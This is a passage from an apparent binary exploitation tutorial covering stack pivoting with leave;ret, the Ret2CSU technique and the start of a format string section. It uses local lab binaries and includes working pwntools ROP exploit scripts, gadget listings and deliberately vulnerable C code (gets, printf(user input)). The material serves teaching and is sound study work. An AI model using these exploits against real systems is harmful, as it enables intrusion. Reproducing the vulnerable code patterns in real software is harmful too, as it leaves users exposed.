<p>But this time we can only overflow return address value. So when calling for <code>win</code> function we wont have address to put enough of our gadgets to call it. Whenever we get this limited storage in stack remember its stack pivoting challenge. In <strong>stack pivoting</strong> we &ldquo;pivot&rdquo; the stack by changing the stack pointer (<code>RSP</code>) to point to our controlled buffer. Then we will be able to write our ROP chain. For this we will need a gadget that can change the value of <code>rsp</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>‚ùØ ROPgadget --binary pivot
</span></span><span style="display:flex;"><span>&lt;SNIP&gt;
</span></span><span style="display:flex;"><span>0x00000000004012ad : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
</span></span><span style="display:flex;"><span>&lt;SNIP&gt;
</span></span></code></pre></div><p>We got the address but there is major problem, it has <code>pop rsp</code> but it also has other registers which we wont be able to add in our stack because of its limited storage. Now what can we do?</p>
<p>Let&rsquo;s go back to basics of assembly. The <code>leave</code> instruction in x86/x86-64 is a <strong>stack frame teardown instruction</strong> , it‚Äôs typically used at the end of a function to clean up the <strong>stack frame</strong> set up by <code>push rbp; mov rbp, rsp</code>. Basically it is shortcut to two instructions.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>mov rsp, rbp
</span></span><span style="display:flex;"><span>pop rbp
</span></span></code></pre></div><p>Because <code>leave</code> modifies <code>rsp</code> to the value of <code>rbp</code>, if you control the value of <code>rbp</code> before <code>leave</code> executes, you can effectively &ldquo;pivot&rdquo; the stack pointer to any memory region you want. Luckily we have <code>leave</code> instruction in our binary.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>‚ùØ ROPgadget --binary pivot
</span></span><span style="display:flex;"><span>&lt;SNIP&gt;
</span></span><span style="display:flex;"><span>0x0000000000401234 : leave ; ret
</span></span><span style="display:flex;"><span>&lt;SNIP&gt;
</span></span></code></pre></div><p>We have to do <code>leave ; ret</code> 2 times. The first <code>leave; ret</code> sets <code>rsp</code> to a buffer we control and updates <code>rbp</code> to a new value from that buffer. The second <code>leave; ret</code> then uses this new <code>rbp</code> to move <code>rsp</code> again, finally pointing to our full ROP chain.</p>
<p>The leaked address that we had when starting program we can use that address as to store the new value for <code>rbp</code> before the <code>leave; ret</code> instruction, so when <code>leave</code> runs, it sets <code>rsp</code> to this buffer and that leaked address has enough storage (256 bytes) to write our payload.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/python3</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>elf <span style="color:#f92672">=</span> context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;./pivot&#39;</span>)
</span></span><span style="display:flex;"><span>io <span style="color:#f92672">=</span> process()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Receive the leaked pivot address from the program&#39;s output</span>
</span></span><span style="display:flex;"><span>leak <span style="color:#f92672">=</span> int(io<span style="color:#f92672">.</span>recvline(keepends<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>)<span style="color:#f92672">.</span>split(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;- &#39;</span>)[<span style="color:#ae81ff">1</span>], <span style="color:#ae81ff">16</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>payload1 <span style="color:#f92672">=</span> pack(<span style="color:#ae81ff">0</span>) <span style="color:#75715e"># pop rbp instruction placeholder value</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># We overflow the buffer with 112 bytes to reach saved rbp,</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># then overwrite saved rbp with the leaked pivot address,</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># finally overwrite saved return address with address of &#39;leave; ret&#39; gadget</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> cyclic(<span style="color:#ae81ff">112</span>) <span style="color:#f92672">+</span> p64(leak) <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0x0000000000401234</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(payload)
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>interactive()
</span></span></code></pre></div><p>Offset is 120 but we used 112 because saved <code>rbp</code> is located right before the saved return address, occupying 8 bytes. So, the first 112 bytes fill the buffer, the next 8 bytes overwrite saved <code>rbp</code> (which we control to pivot the stack), and the following 8 bytes overwrite the return address.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">[</span> buffer <span style="color:#f92672">(</span><span style="color:#ae81ff">112</span> bytes<span style="color:#f92672">)</span> <span style="color:#f92672">]</span>  &lt;- our controlled input buffer
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span> saved rbp <span style="color:#f92672">(</span><span style="color:#ae81ff">8</span> bytes<span style="color:#f92672">)</span> <span style="color:#f92672">]</span> &lt;- next <span style="color:#ae81ff">8</span> bytes after buffer <span style="color:#f92672">(</span>offset <span style="color:#ae81ff">112</span> to 120<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span> <span style="color:#66d9ef">return</span> address <span style="color:#f92672">(</span><span style="color:#ae81ff">8</span> bytes<span style="color:#f92672">)</span> <span style="color:#f92672">]</span> &lt;- after saved rbp <span style="color:#f92672">(</span>offset <span style="color:#ae81ff">120</span> to 128<span style="color:#f92672">)</span>
</span></span></code></pre></div><p>We use <code>pack(0)</code> there to provide a placeholder value for the <code>pop rbp</code> instruction that happens right after the <code>leave</code> sets <code>rsp</code> to the pivot address. It can&rsquo;t be blank but we have to put any random dummy value like zero.</p>
<p>Now after doing this we can write our normal payload like  passing arguments with <code>rdi</code> and <code>rsi</code> with <code>0xbabecafe</code> and <code>0xcafebabe</code> respectively. First we need <code>rdi</code> and <code>rsi</code> address.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>‚ùØ ROPgadget --binary pivot
</span></span><span style="display:flex;"><span>&lt;SNIP&gt;
</span></span><span style="display:flex;"><span>0x00000000004012b3 : pop rdi ; ret
</span></span><span style="display:flex;"><span>0x00000000004012b1 : pop rsi ; pop r15 ; ret
</span></span><span style="display:flex;"><span>&lt;SNIP&gt;
</span></span></code></pre></div><p>We have <code>pop rsi ; pop r15 ; ret</code> so we will have to add <code>r15</code> value also necessarily (which we can put simply <code>0</code>) this time we won&rsquo;t have any problems because its not in stack this time but its in leaked address which has enough storage.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/python3
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>from pwn import *
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>elf <span style="color:#f92672">=</span> context.binary <span style="color:#f92672">=</span> ELF<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;./pivot&#39;</span><span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>io <span style="color:#f92672">=</span> process<span style="color:#f92672">()</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>leak <span style="color:#f92672">=</span> int<span style="color:#f92672">(</span>io.recvline<span style="color:#f92672">(</span>keepends<span style="color:#f92672">=</span>False<span style="color:#f92672">)</span>.split<span style="color:#f92672">(</span>b<span style="color:#e6db74">&#39;- &#39;</span><span style="color:#f92672">)[</span>1<span style="color:#f92672">]</span>,16<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>payload1 <span style="color:#f92672">=</span>  pack<span style="color:#f92672">(</span>0<span style="color:#f92672">)</span> + pack<span style="color:#f92672">(</span>0x00000000004012b3<span style="color:#f92672">)</span> + pack<span style="color:#f92672">(</span>0xbabecafe<span style="color:#f92672">)</span> + pack<span style="color:#f92672">(</span>0x00000000004012b1<span style="color:#f92672">)</span> + pack<span style="color:#f92672">(</span>0xcafebabe<span style="color:#f92672">)</span> + pack<span style="color:#f92672">(</span>0<span style="color:#f92672">)</span> + pack<span style="color:#f92672">(</span>elf.sym.win<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> cyclic<span style="color:#f92672">(</span>112<span style="color:#f92672">)</span> + pack<span style="color:#f92672">(</span>leak<span style="color:#f92672">)</span> + pack<span style="color:#f92672">(</span>0x0000000000401234<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>io.sendline<span style="color:#f92672">(</span>payload1<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>io.sendline<span style="color:#f92672">(</span>payload<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>io.interactive<span style="color:#f92672">()</span>
</span></span></code></pre></div><h2 id="0xd---ret2csu---one-gadget">0xD - Ret2CSU  | One Gadget</h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span><span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span><span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span><span style="color:#75715e">&lt;unistd.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">vuln</span>() {
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">char</span> buff[<span style="color:#ae81ff">40</span>];
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">write</span>(<span style="color:#ae81ff">1</span>,<span style="color:#e6db74">&#34;Enter Data - &#34;</span>,<span style="color:#ae81ff">13</span>);
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">read</span>(<span style="color:#ae81ff">0</span>,buff,<span style="color:#ae81ff">300</span>);	
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>() {
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">vuln</span>();
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p><code>gcc ret2csu.c -o ret2csu -no-pie -fno-stack-protector</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>‚ùØ ls -la ret2csu              
</span></span><span style="display:flex;"><span>-rwsr-sr-x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">16704</span> Jun <span style="color:#ae81ff">26</span> 17:03 ret2csu
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>‚ùØ checksec --file<span style="color:#f92672">=</span>ret2csu     
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> <span style="color:#e6db74">&#39;/home/at0m/ret2csu&#39;</span>
</span></span><span style="display:flex;"><span>    Arch:       amd64-64-little
</span></span><span style="display:flex;"><span>    RELRO:      Partial RELRO
</span></span><span style="display:flex;"><span>    Stack:      No canary found
</span></span><span style="display:flex;"><span>    NX:         NX enabled
</span></span><span style="display:flex;"><span>    PIE:        No PIE <span style="color:#f92672">(</span>0x400000<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>    SHSTK:      Enabled
</span></span><span style="display:flex;"><span>    IBT:        Enabled
</span></span><span style="display:flex;"><span>    Stripped:   No
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>‚ùØ ./ret2csu    
</span></span><span style="display:flex;"><span>Enter Data - AAAAAAAAA
</span></span></code></pre></div><p><img src="/img/ret2csu.png" alt="ret2csu.png"></p>
<p><code>main</code> function is just calling <code>vuln</code> function.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>pwndbg&gt; disass vuln
</span></span><span style="display:flex;"><span>Dump of assembler code <span style="color:#66d9ef">for</span> <span style="color:#66d9ef">function</span> vuln:
</span></span><span style="display:flex;"><span>   0x0000000000401156 &lt;+0&gt;:	endbr64
</span></span><span style="display:flex;"><span>   0x000000000040115a &lt;+4&gt;:	push   rbp
</span></span><span style="display:flex;"><span>   0x000000000040115b &lt;+5&gt;:	mov    rbp,rsp
</span></span><span style="display:flex;"><span>   0x000000000040115e &lt;+8&gt;:	sub    rsp,0x30
</span></span><span style="display:flex;"><span>   0x0000000000401162 &lt;+12&gt;:	mov    edx,0xd
</span></span><span style="display:flex;"><span>   0x0000000000401167 &lt;+17&gt;:	lea    rsi,<span style="color:#f92672">[</span>rip+0xe96<span style="color:#f92672">]</span>        <span style="color:#75715e"># 0x402004</span>
</span></span><span style="display:flex;"><span>   0x000000000040116e &lt;+24&gt;:	mov    edi,0x1
</span></span><span style="display:flex;"><span>   0x0000000000401173 &lt;+29&gt;:	call   0x401050 &lt;write@plt&gt;
</span></span><span style="display:flex;"><span>   0x0000000000401178 &lt;+34&gt;:	lea    rax,<span style="color:#f92672">[</span>rbp-0x30<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>   0x000000000040117c &lt;+38&gt;:	mov    edx,0x12c
</span></span><span style="display:flex;"><span>   0x0000000000401181 &lt;+43&gt;:	mov    rsi,rax
</span></span><span style="display:flex;"><span>   0x0000000000401184 &lt;+46&gt;:	mov    edi,0x0
</span></span><span style="display:flex;"><span>   0x0000000000401189 &lt;+51&gt;:	call   0x401060 &lt;read@plt&gt;
</span></span><span style="display:flex;"><span>   0x000000000040118e &lt;+56&gt;:	nop
</span></span><span style="display:flex;"><span>   0x000000000040118f &lt;+57&gt;:	leave
</span></span><span style="display:flex;"><span>   0x0000000000401190 &lt;+58&gt;:	ret
</span></span><span style="display:flex;"><span>End of assembler dump.
</span></span></code></pre></div><p>There are two functions being called one is <code>write</code> that prints and another is <code>read</code> that takes input. They are C functions in wrapper. We are going to perform <code>Ret2PLT</code> and get base address then we are going to spawn shell using <code>Ret2Libc</code> or we can use new technique <code>One Gadget</code> which is more better and easy.</p>
<p>In <code>Ret2PLT</code> section we had <code>put</code> function which only uses 1 argument which we putted <code>GOT</code> address under <code>rdi</code> register but <code>write</code> function takes 3 arguments it means we have to put value in <code>rdi</code>, <code>rsi</code> and <code>rdx</code> register. It is easy to find <code>rdi</code>, <code>rsi</code> gadgets address using ROPGadget in binary but it is very hard to find <code>rdx</code> gadget address in binary.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>‚ùØ ROPgadget --binary ret2csu
</span></span><span style="display:flex;"><span>&lt;SNIP&gt;
</span></span><span style="display:flex;"><span>0x0000000000401213 : pop rdi ; ret
</span></span><span style="display:flex;"><span>0x0000000000401211 : pop rsi ; pop r15 ; ret
</span></span><span style="display:flex;"><span>&lt;SNIP&gt;
</span></span><span style="display:flex;"><span>0x000000000040101a : ret
</span></span><span style="display:flex;"><span>&lt;SNIP&gt;
</span></span></code></pre></div><p>As we can see we have <code>rsi</code> address but with it there is <code>r15</code> also connected so we have to add it to our exploit necessarily.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>pop rsi ; pop r15 ; ret
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>0x0000000000401213 : pop rdi ; ret
</span></span><span style="display:flex;"><span>&lt;SNIP&gt;
</span></span><span style="display:flex;"><span>0x000000000040101a : ret
</span></span></code></pre></div><p>We have <code>rdi</code> and <code>ret</code> also but <code>rdx</code> is nowhere to be found. This is where we use <code>Ret2CSU</code> technique. This doesn&rsquo;t help to bypass ASLR nor on spawning shell but it has only one use case that is if we want to satisfy arguments and we don&rsquo;t have enough gadgets.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>pwndbg&gt; info functions
</span></span><span style="display:flex;"><span>All defined functions:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Non-debugging symbols:
</span></span><span style="display:flex;"><span>0x0000000000401000  _init
</span></span><span style="display:flex;"><span>0x0000000000401050  write@plt
</span></span><span style="display:flex;"><span>0x0000000000401060  read@plt
</span></span><span style="display:flex;"><span>0x0000000000401070  _start
</span></span><span style="display:flex;"><span>0x00000000004010a0  _dl_relocate_static_pie
</span></span><span style="display:flex;"><span>0x00000000004010b0  deregister_tm_clones
</span></span><span style="display:flex;"><span>0x00000000004010e0  register_tm_clones
</span></span><span style="display:flex;"><span>0x0000000000401120  __do_global_dtors_aux
</span></span><span style="display:flex;"><span>0x0000000000401150  frame_dummy
</span></span><span style="display:flex;"><span>0x0000000000401156  vuln
</span></span><span style="display:flex;"><span>0x0000000000401191  main
</span></span><span style="display:flex;"><span>0x00000000004011b0  __libc_csu_init
</span></span><span style="display:flex;"><span>0x0000000000401220  __libc_csu_fini
</span></span><span style="display:flex;"><span>0x0000000000401228  _fini
</span></span></code></pre></div><p><strong>CSU</strong> stands for <strong>‚Äú__libc_csu_init‚Äù</strong>, a function automatically generated by the compiler in ELF binaries. It contains useful gadgets to control multiple registers and call functions. Because it‚Äôs part of the startup code, it‚Äôs always present in many binaries (unless stripped).</p>
<p><img src="/img/ret2csu2.png" alt="ret2csu2.png"></p>
<p>When disassembling <code>__libc_csu_init</code> we can see there are these three instructions that we might find useful:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>0x00000000004011f0 &lt;+64&gt;:	mov    rdx,r14
</span></span><span style="display:flex;"><span>0x00000000004011f3 &lt;+67&gt;:	mov    rsi,r13
</span></span><span style="display:flex;"><span>0x00000000004011f6 &lt;+70&gt;:	mov    edi,r12d
</span></span></code></pre></div><p>Here we moved <code>r14</code> register to <code>rdx</code>, <code>r13</code> register to <code>rsi</code> and lastly we have <code>edi</code> which is 32 bit of <code>rdi</code>, this is enough for our exploit to work.</p>
<p>So if we can control <code>r14</code>, <code>r13</code>, <code>r12d</code> we can control <code>rdx</code>, <code>rsi</code>, <code>esi</code> values but it wont be simple as that because if we directly put address like this  <code>0x00000000004011f0</code>  it will run till <code>ret</code> instruction and its value will be changed.</p>
<p><img src="/img/ret2csu3.png" alt="ret2csu3.png"></p>
<p>If we looked down there are these instruction also:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>0x000000000040120c &lt;+92&gt;:	pop    r12
</span></span><span style="display:flex;"><span>0x000000000040120e &lt;+94&gt;:	pop    r13
</span></span><span style="display:flex;"><span>0x0000000000401210 &lt;+96&gt;:	pop    r14
</span></span></code></pre></div><p>So if we run this above code first, it will set <code>r12</code>, <code>r13</code>, <code>r14</code> register after that we can run:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>0x00000000004011f0 &lt;+64&gt;:	mov    rdx,r14
</span></span><span style="display:flex;"><span>0x00000000004011f3 &lt;+67&gt;:	mov    rsi,r13
</span></span><span style="display:flex;"><span>0x00000000004011f6 &lt;+70&gt;:	mov    edi,r12d
</span></span></code></pre></div><p>The value of <code>r12</code>, <code>r13</code>, <code>r12d</code> will be stored in their respective place and their 3 arguments will be satisfied. So we are going from down to top.</p>
<p>But between those there are some instructions that will mess things up.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>   0x00000000004011f9 &lt;+73&gt;:	call   QWORD PTR <span style="color:#f92672">[</span>r15+rbx*8<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>   0x00000000004011fd &lt;+77&gt;:	add    rbx,0x1
</span></span><span style="display:flex;"><span>   0x0000000000401201 &lt;+81&gt;:	cmp    rbp,rbx
</span></span><span style="display:flex;"><span>   0x0000000000401204 &lt;+84&gt;:	jne    0x4011f0 &lt;__libc_csu_init+64&gt;
</span></span><span style="display:flex;"><span>   0x0000000000401206 &lt;+86&gt;:	add    rsp,0x8
</span></span><span style="display:flex;"><span>   0x000000000040120a &lt;+90&gt;:	pop    rbx
</span></span><span style="display:flex;"><span>   0x000000000040120b &lt;+91&gt;:	pop    rbp
</span></span></code></pre></div><p>Here there is one important <code>call</code> function which will call <code>r15+rbx*8</code> this address and if address is wrong we will get segmentation fault error and crash our program. We need to put such value in <code>r15</code>, <code>rbx</code> that when the calculation happens it will go to correct address that will exist in memory. Not only this but we also need to control <code>rbp</code> because in <code>0x0000000000401201</code> there is a compare instruction that will check if <code>rbp</code> and <code>rbx</code> are equal and if not equal to it will jump back to <code>0x4011f0</code> which is essentially a loop.</p>
<p>First as always find overflow offset which I have found already and it is <code>56</code>.</p>
<p><img src="/img/ret2csu4.png" alt="ret2csu4.png"></p>
<p>Okay so in return address we have putted this <code>0x000000000040120</code> address, now we need to fill value in those <code>rbx</code>, <code>rbp</code> and other. First is <code>rbx</code> we need to be careful in putting value of registers because they will be calculated above. For example this <code>rbx</code> register we are adding value to will be calculated above <code>r15+rbx*8</code>. We can put <code>rbx</code> value as <code>0</code> because if we put <code>0</code> the calculation of <code>r15+rbx*8</code> will be:</p>
<p><code>r15+0*8=r15</code></p>
<p>which will make our work easier.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/python3</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>elf <span style="color:#f92672">=</span> context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;./ret2csu&#39;</span>)
</span></span><span style="display:flex;"><span>io <span style="color:#f92672">=</span> process()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> cyclic(<span style="color:#ae81ff">52</span>) <span style="color:#f92672">+</span> pack(<span style="color:#ae81ff">0x000000000040120a</span>) <span style="color:#f92672">+</span> pack(<span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(payload)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>interactive()
</span></span></code></pre></div><p>Next is <code>rbp</code>. We also need to be careful because in its assembly instruction.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>   0x00000000004011f9 &lt;+73&gt;:	call   QWORD PTR <span style="color:#f92672">[</span>r15+rbx*8<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>   0x00000000004011fd &lt;+77&gt;:	add    rbx,0x1
</span></span><span style="display:flex;"><span>   0x0000000000401201 &lt;+81&gt;:	cmp    rbp,rbx
</span></span><span style="display:flex;"><span>   0x0000000000401204 &lt;+84&gt;:	jne    0x4011f0 &lt;__libc_csu_init+64&gt;
</span></span><span style="display:flex;"><span>   0x0000000000401206 &lt;+86&gt;:	add    rsp,0x8
</span></span><span style="display:flex;"><span>   0x000000000040120a &lt;+90&gt;:	pop    rbx
</span></span><span style="display:flex;"><span>   0x000000000040120b &lt;+91&gt;:	pop    rbp
</span></span></code></pre></div><p>We can see that <code>rbp</code> value will later be compared will <code>rbx</code> but before that <code>rbx</code> value will added as <code>0x1</code> (1), so we must put <code>rbp</code> value as <code>1</code> because if its <code>1</code> the comparison between <code>rbp</code> and <code>rbx</code> will be equal.</p>
<p><strong>Paused</strong></p>
<h2 id="0xe---format-string">0xE - Format String</h2>
<p>A <strong>format string</strong> is a string that contains special placeholders used to format and insert variables into output. These placeholders are typically defined by the programming language and allow values (like integers, strings, or memory addresses) to be embedded in a controlled way.</p>
<p>In <strong>C</strong>, for example, format strings are used with functions like <code>printf</code>, <code>sprintf</code>, and <code>fprintf</code>.</p>
<p>Example:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">int</span> age <span style="color:#f92672">=</span> <span style="color:#ae81ff">25</span>;
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;I am %d years old.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, age);
</span></span></code></pre></div><p>In the above code:</p>
<ul>
<li><code>&quot;I am %d years old.\n&quot;</code> is the <strong>format string</strong>.</li>
<li><code>%d</code> is a <strong>format specifier</strong> for an integer,</li>
<li><code>age</code> is the variable being inserted in place of <code>%d</code>.</li>
</ul>
<p><strong>Some common format specifiers in C</strong>:</p>
<table>
  <thead>
      <tr>
          <th>Specifier</th>
          <th>Description</th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td><code>%d</code></td>
          <td>Integer (decimal)</td>
      </tr>
      <tr>
          <td><code>%x</code></td>
          <td>Hexadecimal (lowercase)</td>
      </tr>
      <tr>
          <td><code>%s</code></td>
          <td>String</td>
      </tr>
      <tr>
          <td><code>%p</code></td>
          <td>Pointer (memory addr)</td>
      </tr>
      <tr>
          <td><code>%f</code></td>
          <td>Float</td>
      </tr>
      <tr>
          <td><code>%c</code></td>
          <td>Character</td>
      </tr>
      <tr>
          <td><code>%n</code></td>
          <td>Number of bytes written</td>
      </tr>
      <tr>
          <td>Note: In <code>%s</code> and <code>%n</code> arguments are passed as reference.</td>
          <td></td>
      </tr>
  </tbody>
</table>
<p>A <strong>format string vulnerability</strong> occurs when <strong>user input is passed directly as the format string</strong>  without any format specifiers being hardcoded.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">char</span> name[<span style="color:#ae81ff">100</span>];
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">gets</span>(name);       <span style="color:#75715e">// User input: &#34;My name is %x %x %x&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">printf</span>(name);     <span style="color:#75715e">// VULNERABLE
</span></span></span></code></pre></div><p>Here, instead of <code>printf(&quot;%s&quot;, name);</code>, the program does <code>printf(name);</code> so if the input contains <code>%x</code>, <code>printf</code> will read raw data from the stack and print it. That‚Äôs the entry point for abuse.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">// A simple C program with format
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// string vulnerability
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#75715e">#include</span><span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
